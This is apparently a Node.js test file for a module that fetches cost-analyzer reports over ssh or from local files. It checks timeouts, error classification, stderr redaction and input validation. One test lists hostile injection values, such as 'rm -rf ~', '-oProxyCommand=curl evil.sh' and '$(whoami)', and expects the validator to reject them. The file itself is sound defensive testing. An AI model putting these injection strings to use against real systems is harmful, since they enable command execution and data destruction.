import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fetchSource, validateSourceEntry, MAX_REPORT_BYTES } from './source-fetch.mjs';

const sshSource = { id: 'laptop', type: 'ssh', host: 'laptop.local', remotePath: '~/.tools-config/tokens-cost-analyzer/report.v1.json' };

function executorReturning(result, calls = []) {
  return async (file, args, options) => {
    calls.push({ file, args, options });
    return typeof result === 'function' ? result(file, args, options) : result;
  };
}

async function workDir(t) {
  const dir = await mkdtemp(join(tmpdir(), 'tokens-fetch-'));
  t.after(() => rm(dir, { recursive: true, force: true }));
  return dir;
}

test('the ssh invocation is BatchMode, argument-array, and bounded by both timeouts', async () => {
  const calls = [];
  const result = await fetchSource({ ...sshSource, timeoutSeconds: 7 }, { executor: executorReturning({ code: 0, stdout: '{"ok":true}' }, calls) });

  assert.deepEqual(result, { ok: true, text: '{"ok":true}' });
  assert.equal(calls.length, 1);
  assert.equal(calls[0].file, 'ssh');
  assert.deepEqual(calls[0].args, [
    '-o', 'BatchMode=yes',
    '-o', 'ConnectTimeout=7',
    'laptop.local',
    'cat',
    '~/.tools-config/tokens-cost-analyzer/report.v1.json',
  ]);
  assert.equal(calls[0].options.timeout, 7000, 'a hard local timeout backs ConnectTimeout');
  assert.equal(calls[0].options.maxBuffer, MAX_REPORT_BYTES);
  assert.ok(!calls[0].args.some((arg) => /StrictHostKeyChecking|UserKnownHostsFile/.test(arg)), 'host verification is never bypassed');
});

test('shell metacharacters and leading dashes are rejected before ssh is ever run', async () => {
  const calls = [];
  const executor = executorReturning({ code: 0, stdout: '{}' }, calls);
  const hostile = [
    { ...sshSource, host: 'laptop.local; rm -rf ~' },
    { ...sshSource, host: '-oProxyCommand=curl evil.sh' },
    { ...sshSource, host: 'laptop.local\ncat /etc/passwd' },
    { ...sshSource, remotePath: '~/report.json && curl evil.sh' },
    { ...sshSource, remotePath: '$(whoami)/report.json' },
    { ...sshSource, remotePath: '`id`' },
    { ...sshSource, remotePath: '-oProxyCommand=x' },
  ];

  for (const source of hostile) {
    const result = await fetchSource(source, { executor });
    assert.equal(result.ok, false);
    assert.equal(result.state, 'invalid', `expected rejection for ${JSON.stringify(source)}`);
  }
  assert.equal(calls.length, 0, 'nothing hostile reaches execFile');
});

test('malformed source entries are rejected as invalid rather than throwing', () => {
  assert.equal(validateSourceEntry(null).state, 'invalid');
  assert.match(validateSourceEntry({ id: 'Laptop', type: 'ssh' }, 0).detail, /sources\[0\]\.id is invalid/);
  assert.match(validateSourceEntry({ id: 'laptop', type: 'http' }, 1).detail, /sources\[1\]\.type/);
  assert.match(validateSourceEntry({ ...sshSource, timeoutSeconds: 0 }).detail, /timeoutSeconds/);
  const valid = validateSourceEntry(sshSource);
  assert.equal(valid.ok, true);
  assert.deepEqual(valid.value, { ...sshSource, timeoutSeconds: 10, enabled: true, includeWhenStale: true });
});

test('every ssh failure mode maps to a typed state and never leaks stderr', async () => {
  const secrets = 'kancho@laptop.local: Permission denied (publickey). identity file /home/kancho/.ssh/id_ed25519';
  const cases = [
    { name: 'auth refused', result: { code: 255, stderr: secrets }, state: 'unauthorized' },
    { name: 'would prompt', result: { code: 255, stderr: 'Host key verification failed for laptop.local' }, state: 'unauthorized' },
    { name: 'unreachable', result: { code: 255, stderr: 'ssh: connect to host laptop.local port 22: Connection timed out' }, state: 'unreachable' },
    { name: 'missing report', result: { code: 1, stderr: 'cat: /home/kancho/report.v1.json: No such file or directory' }, state: 'missing' },
    { name: 'directory not file', result: { code: 1, stderr: 'cat: /home/kancho/.tools-config: Is a directory' }, state: 'unreadable' },
    { name: 'unreadable', result: { code: 1, stderr: 'cat: /root/report.v1.json: Permission denied' }, state: 'unreadable' },
    { name: 'other non-zero exit', result: { code: 3, stderr: 'weird failure on laptop.local' }, state: 'unreadable' },
    { name: 'timing out mid-stream', result: { code: null, timedOut: true, stdout: '{"partial"' }, state: 'unreadable' },
    { name: 'oversized', result: { code: null, truncated: true }, state: 'unreadable' },
    { name: 'empty output', result: { code: 0, stdout: '   ' }, state: 'invalid' },
    { name: 'ssh missing locally', result: { code: null, spawnError: 'ENOENT' }, state: 'unreadable' },
  ];

  for (const { name, result, state } of cases) {
    const outcome = await fetchSource(sshSource, { executor: executorReturning(result) });
    assert.equal(outcome.ok, false, name);
    assert.equal(outcome.state, state, name);
    assert.equal(typeof outcome.detail, 'string', name);
    assert.doesNotMatch(outcome.detail, /kancho|laptop\.local|id_ed25519|\.ssh/, `${name} detail must not echo ssh stderr`);
  }
});

test('a throwing executor is contained rather than propagated', async () => {
  const timedOut = Object.assign(new Error('boom'), { killed: true });
  assert.deepEqual(await fetchSource(sshSource, { executor: () => Promise.reject(timedOut) }), {
    ok: false, state: 'unreadable', detail: 'the source stopped responding before the report finished transferring',
  });

  // A spawn failure is local to this machine, so it classifies identically
  // whether the executor reports it as a flag or as a rejection.
  const spawnFailed = Object.assign(new Error('nope'), { code: 'EPERM' });
  const rejected = await fetchSource(sshSource, { executor: () => Promise.reject(spawnFailed) });
  const flagged = await fetchSource(sshSource, { executor: executorReturning({ code: null, spawnError: 'EPERM' }) });
  assert.equal(rejected.ok, false);
  assert.equal(rejected.state, 'unreadable');
  assert.deepEqual(flagged, rejected);
});

test('timeouts are bounded above and ~ must be followed by a separator', async () => {
  assert.match(validateSourceEntry({ ...sshSource, timeoutSeconds: 1e9 }).detail, /no greater than 300/);
  assert.equal(validateSourceEntry({ ...sshSource, timeoutSeconds: 300 }).ok, true);
  assert.equal(validateSourceEntry({ id: 'u', type: 'file', path: '~user/report.v1.json' }).state, 'invalid');
  assert.equal(validateSourceEntry({ id: 'u', type: 'file', path: '~/report.v1.json' }).ok, true);
});

test('an oversized ssh payload is rejected even when the executor returns it whole', async () => {
  const outcome = await fetchSource(sshSource, { executor: executorReturning({ code: 0, stdout: 'x'.repeat(50) }), maxBytes: 10 });
  assert.equal(outcome.state, 'unreadable');
  assert.match(outcome.detail, /exceeds the 10 byte limit/);
});

test('file sources read a regular file and classify the filesystem failures', async (t) => {
  const dir = await workDir(t);
  const path = join(dir, 'report.v1.json');
  await writeFile(path, '{"schema":"tokens-cost-analyzer/report"}');
  const source = { id: 'synced', type: 'file', path };

  assert.deepEqual(await fetchSource(source), { ok: true, text: '{"schema":"tokens-cost-analyzer/report"}' });
  assert.equal((await fetchSource({ ...source, path: join(dir, 'absent.json') })).state, 'missing');

  const dirPath = join(dir, 'nested');
  await mkdir(dirPath);
  assert.equal((await fetchSource({ ...source, path: dirPath })).state, 'unreadable');

  const linkPath = join(dir, 'link.json');
  await symlink(path, linkPath);
  const linked = await fetchSource({ ...source, path: linkPath });
  assert.equal(linked.state, 'unreadable');
  assert.match(linked.detail, /symlink/);

  assert.equal((await fetchSource(source, { maxBytes: 4 })).state, 'unreadable');
  assert.equal((await fetchSource({ ...source, path: 'relative/report.json' })).state, 'invalid');
});

test('file sources expand ~ against the home directory', async (t) => {
  const dir = await workDir(t);
  await writeFile(join(dir, 'report.v1.json'), '{"ok":1}');
  const outcome = await fetchSource({ id: 'home-source', type: 'file', path: '~/report.v1.json' }, { home: dir });
  assert.deepEqual(outcome, { ok: true, text: '{"ok":1}' });
});

test('sources are fetched concurrently, so latency is the slowest source not the sum', async () => {
  const slow = (ms) => async () => { await new Promise((done) => setTimeout(done, ms)); return { code: 0, stdout: '{"ok":true}' }; };
  const started = Date.now();
  const results = await Promise.all([
    fetchSource({ ...sshSource, id: 'a' }, { executor: slow(60) }),
    fetchSource({ ...sshSource, id: 'b' }, { executor: slow(60) }),
    fetchSource({ ...sshSource, id: 'c' }, { executor: slow(60) }),
  ]);
  const elapsed = Date.now() - started;

  assert.ok(results.every((result) => result.ok));
  assert.ok(elapsed < 150, `expected concurrent fetches, took ${elapsed}ms`);
});
